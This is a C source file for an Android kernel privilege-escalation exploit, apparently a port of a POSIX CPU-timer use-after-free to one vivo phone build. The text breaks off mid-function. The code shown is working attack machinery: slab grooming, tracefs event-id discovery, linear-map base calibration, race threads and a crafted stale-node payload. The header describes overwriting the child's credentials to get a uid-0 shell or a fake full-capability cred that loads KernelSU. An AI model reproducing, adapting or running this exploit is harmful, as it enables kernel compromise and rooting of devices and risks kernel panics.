/*
 * CVE-2026-98260 posix cpu timers: uid-0 shell + KernelSU late-load
 * Target : vivo PD2571, firmware 15 / Android 16 userland
 * Kernel : 6.1.145-android14-11-maybe-dirty
 * SELinux: Enforcing
 * Patches: absent
 * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
 *
 * Adapted from woshigenm/CVE-2026-98260 (MIT) and the other 98260 ports.
 * The trigger, slab layout and offsets are the same; the do_timer_create
 * call site and the tracefs event ids are per-build and are re-derived here.
 *
 * Two endgames:
 *
 *   default / shell / verify
 *     One zero write to the child's real cred clears uid/gid.  The child
 *     calls setuid(0) and execs sh -> uid 0 in u:r:shell:s0.  This is a
 *     shell-domain root with only the bounding-set capabilities.
 *
 *   fake
 *     Point task->cred at a fake full-capability cred in the reclaimed
 *     order-1 page, then fix uid/gid.  The child forks a worker; fork's
 *     prepare_creds() normalizes cred/real_cred and allocates a real SELinux
 *     blob.  The worker execs ksud late-load, which resolves the installed
 *     manager's libksud.so and loads the matching android14-6.1 module.
 *     The parent exits once the handoff is verified, closing the socket
 *     buffers that held the fake cred page.
 *
 * The trigger leaves a stale timerqueue node behind whenever a plant wins the
 * UAF but the spray fails to reclaim the page: the zombie is then held on
 * purpose and the run exits non-zero, because reaping an uncontrolled node
 * panics this kernel.  Reboot is the only cleanup for that case; a run that
 * fails without holding a node simply exits and can be retried as-is.  Event
 * ids and the linear-map base are discovered at runtime; the tracefs metadata
 * files are not readable from the shell domain.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#if defined(__ANDROID__)
#include <sys/system_properties.h>
#endif

#define TR "/sys/kernel/tracing"
#define CPU_TRIG 2
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define PREFILL_TIMERS 4096
#define VMA_COUNT 50000
#define HELPER_STACK (1 << 20)
#define LOCKERS 3
#define PAGE 4096UL
#define SOCKBUF 8192
#define MIN_PAGE_PAIRS 64

/* ---- per-build constants -----------------------------------------------
 *
 * Everything that describes one kernel image lives in profiles.h, selected
 * with -DIC_PROFILE_<name> (default: PD2571).  Porting to another build
 * means re-deriving all four groups:
 *   - static addresses  = /proc/kallsyms minus slide,
 *                         slide = _text - KIMAGE_TEXT_BASE
 *   - struct offsets    = /sys/kernel/btf/vmlinux
 *   - call-site low21   = disassemble the extracted arm64 Image and read the
 *                         return site of the alloc call, then confirm it
 *                         against a live ftrace capture
 *   - tracefs event ids = image properties too, but they are discovered at
 *                         run time and never hardcoded here
 *
 * The static column is only valid while KIMAGE_TEXT_BASE keeps its default;
 * g_slide is measured at run time from the timer alloc site, so a different
 * link base shifts every static address consistently and cancels out.
 */
#include "profiles.h"
#include "ic_syms.h"
#include "extra_syms.h"
static int g_timer_site_kind = 0;
/* Runtime-detected do_timer_create call site.  The low 21 bits are a
 * per-build constant (the KASLR slide is 2 MiB aligned and does not touch
 * them) and every k_itimer allocation record carries bytes_req==TIMER_ALLOC,
 * so the trigger does not depend on a profile match.  When the detected
 * site differs from the profile, the static addresses (slide, TP, SELinux)
 * are left unused and only the runtime-only shell path can run. */
static unsigned long long g_timer_site_low = TIMER_SITE_LOW21;
static int g_static_ok = 1;
static int detect_timer_site(const unsigned char *b, size_t n, int pid);

/* vivo vr.ko: __tracepoint_sys_exit, funcs at +0x40 on this ABI.  Layout
 * confirmed two ways: BTF (name@0x00 ... funcs@0x40) and the Image itself
 * (the +0x00 qword points at the "sys_exit" string, +0x40 is the only NULL
 * callback slot).  A newer kernel that grows another member before funcs
 * shifts this -- re-check against BTF after any kernel bump. */
#define KSU_PKG "me.weishu.kernelsu"

#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552

struct child_report
{
    int magic;
    int uid, euid;
    int setuid_ret, setuid_errno;
    int ruid, reuid, rsuid;
};

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
static _Atomic int g_exec_tid, g_target_tgid;
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
static int g_timer_go_r = -1, g_timer_go_w = -1;
static int g_cpu = CPU_TRIG;
static unsigned long long g_base;
static unsigned long long g_rel_static, g_rel_off;
/* Runtime symbols from /proc/kallsyms, when the shell domain can read them.
 * vivo normally masks the addresses (kptr_restrict), but when it does not
 * this removes every per-build constant from the de-tag step. */
static unsigned long long g_text_runtime, g_tp_runtime, g_selinux_runtime;
static unsigned long long g_tp_link, g_selinux_link;
static unsigned long long g_root_user_link, g_init_user_ns_link;
static unsigned long long g_init_ucounts_link, g_init_groups_link;
static unsigned long long g_init_cred_link;
static int g_rel_mode;
static unsigned long long g_slide;
static unsigned long long g_rel_abs;
static int g_held;
static int g_fake_stage;
static int g_exec_payload; /* ksu mode: run PAYLOAD_CMD as the fake-cred root */
static int g_full_shell;
static int g_root_ok;
static int g_diag;
static unsigned long long g_child_task;
static unsigned g_t_page_alloc, g_t_page_free;

static void logf(const char *fmt, ...);

static void slab_usage(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];

    if (!f)
        return;
    while (fgets(line, sizeof(line), f))
    {
        unsigned active = 0, total = 0;

        if (strncmp(line, "posix_timers_cache", 18))
            continue;
        if (sscanf(line, "posix_timers_cache %u %u", &active, &total) == 2)
            logf("[slab] %s active=%u total=%u\n", tag, active, total);
        break;
    }
    fclose(f);
}

static void logf(const char *fmt, ...)
{
    va_list ap;
    char buf[1024];
    int saved_errno = errno;

    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    fputs(buf, stdout);
    fflush(stdout);
    errno = saved_errno;
}

static int wr(const char *p, const char *s)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0)
        return -1;
    int r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -1 : 0;
}
static void pin(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}
static unsigned u32(const unsigned char *b, size_t o)
{
    unsigned v;
    memcpy(&v, b + o, 4);
    return v;
}
static unsigned long long u64(const unsigned char *b, size_t o)
{
    unsigned long long v;
    memcpy(&v, b + o, 8);
    return v;
}

static void enable_events(void)
{
    static const char *evs[] = {
        "enable_event:kmem:kmem_cache_alloc\n",
        "enable_event:kmem:mm_page_free\n",
        "enable_event:kmem:mm_page_alloc\n",
    };
    for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
}

static void drain_cpu(int cpu)
{
    unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}
static void trace_start(void)
{
    wr(TR "/tracing_on", "0");
    wr(TR "/trace", "\n");
    drain_cpu(g_cpu);
    wr(TR "/tracing_on", "1");
}
static void trace_stop(void) { wr(TR "/tracing_on", "0"); }

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128];
    size_t tot = 0;
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);
        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    close(fd);
    return (long)tot;
}

static int is_kernel_ptr(unsigned long long v)
{
    return (v >> 48) == 0xffffULL;
}

/*
 * Raw ftrace field layout (per-boot ids have no readable metadata):
 *   kmem_cache_alloc: [i-4] pid, [i] site, [i+8] ptr, [i+16] req, [i+24] alloc
 *   mm_page_alloc/free: [i-8] type, [i-4] pid, [i] pfn, [i+8] order
 */
/* Identify this build's do_timer_create allocation call site from the
 * k_itimer records themselves (bytes_req/alloc == TIMER_ALLOC).  Keeps the
 * trigger working on builds whose static addresses we do not have. */
static int detect_timer_site(const unsigned char *b, size_t n, int pid)
{
    unsigned long long low[8] = {0}, cnt[8] = {0};
    int hc = 0, best = 0, k, f;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, req, alloc, l;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        req = u64(b, i + 16);
        alloc = u64(b, i + 24);
        if (req != TIMER_ALLOC && alloc != TIMER_ALLOC)
            continue;
        site = u64(b, i);
        if (!is_kernel_ptr(site))
            continue;
        l = site & 0x1fffffULL;
        f = 0;
        for (k = 0; k < hc; k++)
            if (low[k] == l)
            {
                cnt[k]++;
                f = 1;
                break;
            }
        if (!f && hc < 8)
        {
            low[hc] = l;
            cnt[hc] = 1;
            hc++;
        }
    }
    if (!hc)
        return 0;
    for (k = 1; k < hc; k++)
        if (cnt[k] > cnt[best])
            best = k;
    g_timer_site_low = low[best];
    if (g_timer_site_low != TIMER_SITE_LOW21 &&
        g_timer_site_low != TIMER_SITE_LOW21_2)
    {
        g_static_ok = 0;
        logf("[site] timer call site low21=%#llx differs from profile (%#llx);"
             " static addresses stay unused\n",
             g_timer_site_low, (unsigned long long)TIMER_SITE_LOW21);
    }
    else
        logf("[site] timer call site low21=%#llx matches profile\n",
             g_timer_site_low);
    return 1;
}

static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
                             unsigned long long *out, int max,
                             unsigned long long *first_site)
{
    int cnt = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        {
            unsigned long long low = site & 0x1fffffULL;
            if (low != g_timer_site_low)
                continue;
            if (!cnt && !first_site) g_timer_site_kind = (low == TIMER_SITE_LOW21) ? 0 : 1;
        }
        ptr = u64(b, i + 8);
        if (u64(b, i + 16) != TIMER_ALLOC ||
            u64(b, i + 24) != TIMER_ALLOC || !is_kernel_ptr(ptr))
            continue;
        if (!cnt && first_site)
            *first_site = site;
        if (cnt < max)
            out[cnt++] = ptr;
    }
    return cnt;
}

static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *site_out,
                            unsigned long long *ptr_out)
{
    int found = 0;

    for (size_t i = 16; i + 24 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 12) != (unsigned)pid)
            continue;
        ptr = u64(b, i);
        if (!is_kernel_ptr(ptr) || u64(b, i + 8) != CRED_REQ ||
            u64(b, i + 16) != CRED_ALLOC)
            continue;
        site = u64(b, i - 8);
        if (!is_kernel_ptr(site))
            continue;
        if (!found)
        {
            *site_out = site;
            *ptr_out = ptr;
        }
        found++;
    }
    return found;
}

static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *out)
{
    int pass, found = 0;

    /* Pass 0 filters on the profile's copy_process call site.  Builds whose
     * layout differs yield nothing there (observed: task_recs=0 on
     * 16.2.20.3 and 16.1.17.10), so pass 1 keeps only the size filter: a
     * task_struct allocation is one of the very few caches with a ~0x1500
     * object, and the record must still belong to the forking parent. */
    for (pass = 0; pass < 2; pass++)
    {
        found = 0;
        for (size_t i = 8; i + 32 <= n; i += 4)
        {
            unsigned long long site, ptr, req, alloc;

            if (u32(b, i - 4) != (unsigned)pid)
                continue;
            site = u64(b, i);
            if (!pass)
            {
                unsigned long long low = site & 0x1fffffULL;

                if (low != COPY_PROCESS_LOW21 && low != COPY_PROCESS_LOW21_2)
                    continue;
            }
            ptr = u64(b, i + 8);
            req = u64(b, i + 16);
            alloc = u64(b, i + 24);
            if (!is_kernel_ptr(ptr))
                continue;
            /* task_struct_cachep rounds 0x1440 to 0x1640 on this build. */
            if (req != TASK_ALLOC_BYTES && alloc != TASK_ALLOC_BYTES &&
                req != 0x1440 && alloc != 0x1440 &&
                req != 0x1640 && alloc != 0x1640)
                continue;
            *out = ptr;
            found++;
        }
        if (found)
            break;
    }
    return found;
}

static int scan_page_free(const unsigned char *b, size_t n,
                          unsigned long long pfn)
{
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) == g_t_page_free)
            return 1;
    }
    return 0;
}

struct page_pair
{
    unsigned long long pfn;
    unsigned alloc_type, free_type, hits;
};

/*
 * Page event ids are assigned at boot and the tracefs metadata is root-only.
 * Allocate/free anonymous pages and pair the same pfn: first alloc, then free.
 */
static int discover_page_types(unsigned char *raw)
{
    struct page_pair pairs[2048];
    int np = 0, me = getpid();
    size_t len = 1024 * PAGE;
    unsigned char *m;
    long n;
    char prev_buf[32];

    /* Zeroed on purpose.  This stack array used to be left uninitialised, and
     * `free_type` is only ever written when a pfn is seen a *second* time --
     * every other slot therefore held garbage, which sailed through the
     * "free_type != 0" filter below and won the hits vote.  Seen in practice
     * as page_free=0x63617274 ("cart" from the previous stack frame), after
     * which every free-detection scan silently failed and the plant never saw
     * its own page come back. */
    memset(pairs, 0, sizeof(pairs));

    trace_stop();
    wr(TR "/trace", "\n");
    for (int c = 0; c < 8; c++)
        drain_cpu(c);

    /* The ring buffer default is small (well under a megabyte per CPU on some
     * builds), and event discovery maps 4 MB of anon pages at once -- the
     * alloc/free pairs fall off the back of the ring before the reader drains
     * it, discovery comes back with a handful of pairs, and MIN_PAGE_PAIRS
     * then (correctly) refuses to proceed.  That reads as "the exploit stopped
     * working" when in fact only the ring was too small.
     *
     * The previous size is read first and put back after the capture: this is
     * per-CPU state, so leaving 16 MB/CPU behind pins that much kernel memory
     * for the rest of the boot. */
    {
        int pfd = open(TR "/buffer_size_kb", O_RDONLY);
        ssize_t pn = -1;

        prev_buf[0] = '\0';
        if (pfd >= 0)
        {
            pn = read(pfd, prev_buf, sizeof(prev_buf) - 1);
            close(pfd);
        }
        if (pn > 0)
        {
            prev_buf[pn] = '\0';
            if (!strchr(prev_buf, '\n'))
                strncat(prev_buf, "\n", sizeof(prev_buf) - strlen(prev_buf) - 1);
        }
        else
            prev_buf[0] = '\0';
    }
    wr(TR "/buffer_size_kb", "16384\n");
    trace_start();
    m = mmap(NULL, len, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED)
    {
        trace_stop();
        if (prev_buf[0])
            wr(TR "/buffer_size_kb", prev_buf);
        return -1;
    }
    for (size_t i = 0; i < len; i += PAGE)
        m[i] = 1;
    munmap(m, len);
    usleep(30000);
    trace_stop();
    if (prev_buf[0])
        wr(TR "/buffer_size_kb", prev_buf);

    n = read_cpu(g_cpu, raw, 32u << 20);
    logf("[ids] trace bytes=%ld\n", n);
    if (n <= 0)
        return -1;
    for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
    {
        unsigned long long pfn = u64(raw, i);
        unsigned order, type;

        if (pfn >= (1ULL << 26))
            continue;
        order = u32(raw, i + 8);
        if (order > 10)
            continue;
        if (u32(raw, i - 4) != (unsigned)me)
            continue;
        type = u32(raw, i - 8) & 0xffff;
        if (!type || type > 1024)
            continue;
        for (int k = 0; k < np; k++)
        {
            if (pairs[k].pfn == pfn)
            {
                if (!pairs[k].alloc_type)
                    pairs[k].alloc_type = type;
                else if (!pairs[k].free_type)
                    pairs[k].free_type = type;
                pairs[k].hits++;
                goto next;
            }
        }
        if (np < 2048)
        {
            pairs[np].pfn = pfn;
            pairs[np].alloc_type = type;
            pairs[np].hits = 1;
            np++;
        }
    next:;
    }

    if (np < MIN_PAGE_PAIRS)
    {
        logf("[-] page event discovery unreliable: pairs=%d < %d; refusing UAF\n",
             np, MIN_PAGE_PAIRS);
        return -1;
    }

    {
        /* Vote the role of each type id over ALL paired pfns rather than
         * trusting whichever single pfn happened to get the most hits.
         *
         * The pairing rule is "first sighting is the alloc, second is the
         * free", which holds within one CPU's ring order -- but a page that
         * was allocated before the window and freed inside it contributes a
         * free record first for that pfn.  A few hundred such pfns are enough
         * to flip the single-best-pair answer, and a swapped pair silently
         * aims the UAF with alloc and free exchanged.  Aggregating the votes
         * keeps the majority correct. */
        unsigned long long first_vote[1025], second_vote[1025];
        unsigned alloc = 0, freed = 0;
        unsigned long long best_first = 0, best_second = 0;

        memset(first_vote, 0, sizeof(first_vote));
        memset(second_vote, 0, sizeof(second_vote));
        for (int k = 0; k < np; k++)
        {
            if (!pairs[k].alloc_type || !pairs[k].free_type ||
                pairs[k].alloc_type == pairs[k].free_type)
                continue;
            first_vote[pairs[k].alloc_type] += pairs[k].hits;
            second_vote[pairs[k].free_type] += pairs[k].hits;
        }
        for (int t = 1; t <= 1024; t++)
            if (first_vote[t] > best_first)
            {
                best_first = first_vote[t];
                alloc = (unsigned)t;
            }
        for (int t = 1; t <= 1024; t++)
            if ((unsigned)t != alloc && second_vote[t] > best_second)
            {
                best_second = second_vote[t];
                freed = (unsigned)t;
            }
        if (!alloc || !freed)
        {
            logf("[-] page event ids not found (records=%zu pairs=%d)\n",
                 (size_t)n, np);
            return -1;
        }
        g_t_page_alloc = alloc;
        g_t_page_free = freed;
    }
    logf("[ids] page_alloc=%u page_free=%u pairs=%d\n",
         g_t_page_alloc, g_t_page_free, np);
    return 0;
}

/*
 * Vote the linear-map base from the target's timer slabs and same-PID order-1
 * page_alloc pfns.  Partial-slab pairings are noise; the true base wins by
 * roughly one vote per slab.
 */
struct base_slot
{
    unsigned long long key;
    int cnt;
};

static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
                                     const unsigned long long *ptrs, int nrec,
                                     int *out_slabs, int *out_pfns)
{
    enum
    {
        MAXS = 256,
        MAXP = 512,
        HBITS = 16,
        HSIZE = 1 << HBITS
    };
    unsigned long long slabs[MAXS], pfns[MAXP];
    static struct base_slot tab[HSIZE];
    int ns = 0, np = 0;
    unsigned long long best_base = 0, best_cnt = 0;

    memset(tab, 0, sizeof(tab));
    for (int i = 0; i < nrec && ns < MAXS; i++)
    {
        unsigned long long s = ptrs[i] & ~0x1fffULL;
        int dup = 0;

        for (int j = 0; j < ns; j++)
            if (slabs[j] == s)
            {
                dup = 1;
                break;
            }
        if (!dup)
            slabs[ns++] = s;
    }
    for (size_t i = 16; i + 12 <= n && np < MAXP; i += 4)
    {
        unsigned long long pfn = u64(b, i);
        int dup = 0;

        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != 1 ||
            u32(b, i - 4) != (unsigned)pid ||
            (u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        for (int j = 0; j < np; j++)
            if (pfns[j] == pfn)
            {
                dup = 1;
                break;
            }
        if (!dup)
            pfns[np++] = pfn;
    }
    for (int i = 0; i < ns; i++)
    {
        for (int j = 0; j < np; j++)
        {
            unsigned long long base = slabs[i] - (pfns[j] << 12);
            unsigned h = (unsigned)((base >> 12) * 2654435761u) &
                         (HSIZE - 1);

            for (int k = 0; k < 64; k++, h = (h + 1) & (HSIZE - 1))
            {
                if (!tab[h].key)
                {
                    tab[h].key = base;
                    tab[h].cnt = 1;
                    break;
                }
                if (tab[h].key == base)
                {
                    tab[h].cnt++;
                    break;
                }
            }
        }
    }
    for (int i = 0; i < HSIZE; i++)
        if (tab[i].key && (unsigned long long)tab[i].cnt > best_cnt)
        {
            best_cnt = tab[i].cnt;
            best_base = tab[i].key;
        }
    *out_slabs = ns;
    *out_pfns = np;
    return best_cnt >= 8 ? best_base : 0;
}

static unsigned long long calibrate_base(unsigned char *raw)
{
    unsigned long long hist[64] = {0}, hcnt[64] = {0};
    unsigned long long recent[64];
    unsigned long long ptrs[512];
    int hc = 0, rn = 0, made = 0, me = getpid(), c = 0;
    long n;

    trace_start();
    for (int i = 0; i < 512; i++)
    {
        struct sigevent ev;
        timer_t t;

        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
            break;
        made++;
    }
    usleep(3000);
    trace_stop();
    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return 0;

    {
        (void)detect_timer_site(raw, (size_t)n, me);
        c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);

        for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
        {
            unsigned long long pfn = u64(raw, i);

            if (pfn >= (1ULL << 26) || (int)u32(raw, i + 8) != 1 ||
                u32(raw, i - 4) != (unsigned)me ||
                (u32(raw, i - 8) & 0xffff) != g_t_page_alloc)
                continue;
            if (rn == 64)
                memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
            recent[rn++] = pfn;
        }
        for (int i = 0; i < c; i++)
        {
            unsigned long long slab = ptrs[i] & ~0x1fffULL;

            for (int j = 0; j < rn; j++)
            {
                unsigned long long base = slab - (recent[j] << 12);
                int f = 0;

                for (int k = 0; k < hc; k++)
                    if (hist[k] == base)
                    {
                        hcnt[k]++;
                        f = 1;
                        break;
                    }
                if (!f && hc < 64)
                {
                    hist[hc] = base;
                    hcnt[hc] = 1;
                    hc++;
                }
            }
        }
    }
    {
        unsigned long long best = 0, bestc = 0;

        for (int k = 0; k < hc; k++)
            if (hcnt[k] > bestc)
            {
                bestc = hcnt[k];
                best = hist[k];
            }
        logf("[base] made=%d c=%d rn=%d best=%#llx count=%llu\n", made,
             c, rn, best, bestc);
        return bestc >= 4 ? best : 0;
    }
}

static void kick_rss(void)
{
    size_t n = (size_t)32 << 20;
    char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += PAGE)
        p[i] = 1;
    munmap(p, n);
}

static timer_t *g_prefill;

static void prefill_timers(int n)
{
    struct sigevent ev;

    g_prefill = calloc((size_t)n, sizeof(*g_prefill));
    if (!g_prefill)
        return;
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < n; i++)
    {
        if (timer_create(CLOCK_MONOTONIC, &ev, &g_prefill[i]))
            break;
    }
}

static int prepare_fragmented_range(void)
{
    size_t len = (size_t)VMA_COUNT * PAGE;
    int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
    void *base;
    if (fd < 0 || ftruncate(fd, PAGE))
        return -1;
    base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED)
        return -1;
    for (unsigned long i = 0; i < VMA_COUNT; i++)
    {
        void *want = (char *)base + i * PAGE;
        if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != want)
            return -1;
    }
    close(fd);
    g_frag_base = base;
    g_frag_len = len;
    return 0;
}

static int locker_fn(void *x)
{
    int prot = PROT_NONE;
    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
    (void)x;

    pin(slot ? 3 : 1);
    while (!atomic_load(&g_go))
        sched_yield();
    atomic_fetch_add(&g_locker_started, 1);
    while (!atomic_load(&g_stop))
    {
        syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
        prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
    }
    _exit(0);
}
static int killer_fn(void *x)
{
    int tid, tgid;
    (void)x;

    pin(2);
    while (!(tid = atomic_load(&g_exec_tid)))
        sched_yield();
    tgid = atomic_load(&g_target_tgid);
    for (;;)
    {
        long r = syscall(SYS_tgkill, tgid, tid, 0);
        if (r < 0 && errno == ESRCH)
            break;
        sched_yield();
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    atomic_store(&g_stop, 1);
    _exit(0);
}
static int spawn_vm_helper(int (*fn)(void *))
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (st == MAP_FAILED)
        return -1;
    int p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
    if (p < 0)
        munmap(st, HELPER_STACK);
    return p;
}

static void *exec_thread(void *x)
{
    struct sigevent ev_none, ev_victim;
    struct itimerspec dormant;
    char b = 'R', ack;
    char *const argv[] = {(char *)"", NULL};
    char *const envp[] = {NULL};
    (void)x;
    pin(2);
    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
    memset(&ev_none, 0, sizeof(ev_none));
    ev_none.sigev_notify = SIGEV_NONE;
    memset(&ev_victim, 0, sizeof(ev_victim));
    ev_victim.sigev_notify = SIGEV_SIGNAL;
    ev_victim.sigev_signo = SIGRTMIN;
    memset(&dormant, 0, sizeof(dormant));
    dormant.it_value.tv_sec = 3600;

    if (write(g_ready_w, &b, 1) != 1)
        _exit(117);
    if (read(g_ack_r, &ack, 1) != 1)
        _exit(118);

    for (int i = 0; i < NTIMERS; i++)
    {
        timer_t t;
        struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
            _exit(120);
        if (i == VICTIM_IDX && timer_settime(t, 0, &dormant, NULL))
            _exit(121);
    }
    {
        int tid = (int)syscall(SYS_gettid);
        atomic_store(&g_exec_tid, tid);
        if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid))
            _exit(122);
    }
    /* Keep the target paused until the parent has captured V and armed the
     * spray; the free still has not happened at this point. */
    if (g_timer_go_r >= 0)
    {
        char tgo;

        if (read(g_timer_go_r, &tgo, 1) != 1)
            _exit(124);
    }
    atomic_store(&g_go, 1);
    while (atomic_load(&g_locker_started) < LOCKERS)
        sched_yield();
    for (volatile unsigned long i = 0; i < 5000000UL; i++)
        __asm__ volatile("" ::: "memory");
    execve("/proc/self/exe", argv, envp);
    _exit(123);
}

static void run_target(void)
{
    pthread_t th;
    sigset_t set;
    atomic_store(&g_target_tgid, (int)getpid());
    pin(2);
    if (prepare_fragmented_range())
        _exit(110);
    for (int i = 0; i < LOCKERS; i++)
        if (spawn_vm_helper(locker_fn) < 0)
            _exit(111);
    if (spawn_vm_helper(killer_fn) < 0)
        _exit(112);
    sigemptyset(&set);
    sigaddset(&set, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &set, NULL);
    if (pthread_create(&th, NULL, exec_thread, NULL))
        _exit(114);
    for (;;)
        sched_yield();
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
    struct timespec pause = {.tv_nsec = 200000};
    for (int i = 0; i < 50000; i++)
    {
        memset(si, 0, sizeof(*si));
        if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
            return -1;
        if (si->si_pid == pid)
            return 0;
        nanosleep(&pause, NULL);
    }
    return -1;
}

static long now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void park_forever(const char *why)
{
    /* Two different situations, deliberately handled differently.
     *
     *  - Nothing held (g_held == 0): the run failed before anything leaked a
     *    stale timer node.  Nothing is owed to the kernel, so exit and let the
     *    caller retry.
     *  - A plant held (g_held > 0): the UAF won but the spray never reclaimed
     *    the page, so an unreaped zombie owns a stale node.  The parent must
     *    stay alive here.  Exiting reparents the zombie to init, which reaps
     *    it and runs the cleanup path this kernel can turn into a panic --
     *    exactly the reason the original code paused instead of returning.
     *
     * T28_NO_HOLD=1 restores the old "just exit" behaviour for automation
     * that would rather gamble than sit on a zombie. */
    if (g_held && !getenv("T28_NO_HOLD"))
    {
        logf("[!] %s -- holding zombie; reboot before rerun "
             "(T28_NO_HOLD=1 to exit anyway)\n", why);
        fflush(stdout);
        for (;;)
            pause();
    }
    logf("[!] %s -- exiting (failed attempt; %s)\n", why,
         g_held ? "reboot before rerun" : "safe to retry");
    fflush(stdout);
    _exit(1);
}

/*
 * Stale timer node layout inside the reclaimed order-1 page.
 *   zero: parent=0 -> rb_erase writes 0 to target.
 *   fake: parent=node -> rb_erase writes node to target (task->cred); the
 *         fake cred fields are overlaid at the same offset by run_plant.
 */
static void build_payload(unsigned char *buf, size_t off,
                          unsigned long long parent, unsigned long long target)
{
    memset(buf, 0, SOCKBUF);
    *(unsigned long long *)(buf + off + 0x00) = parent;
    *(unsigned long long *)(buf + off + 0x10) = target;
}

/* Reads back /sys/fs/selinux/enforce (1 = Enforcing, 0 = Permissive) so the
 * log records whether the byte-level write above actually landed.  A wrong
 * offset here is otherwise indistinguishable from a missed plant. */
static const char *getenforce_now(void)
{
    static char buf[8];
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY);

    buf[0] = '?';
    buf[1] = '\0';
    if (fd < 0)
        return buf;
    if (read(fd, buf, 1) != 1)
        buf[0] = '?';
    buf[1] = '\0';
    close(fd);
    return buf[0] == '0' ? "Permissive" : buf[0] == '1' ? "Enforcing" : "?";
}

/* Real uid of a live (blocked) child, read back from /proc.  The burst-hit
 * oracle only proves that our spray reclaimed the freed order-1 page; it does
 * not prove that the rb_erase which carries the write happened afterwards.
 * When the killer loses the race the exec thread erases the node normally,
 * the reap still finds a clean tree, and the plant reports ok without a byte
 * written -- so the shell path verifies the effect and re-fires. */
static int proc_real_uid(pid_t pid, unsigned long *uid_out)
{
    char path[64], buf[1024];
    char *p;
    ssize_t n;
    int fd;

    snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
    fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;
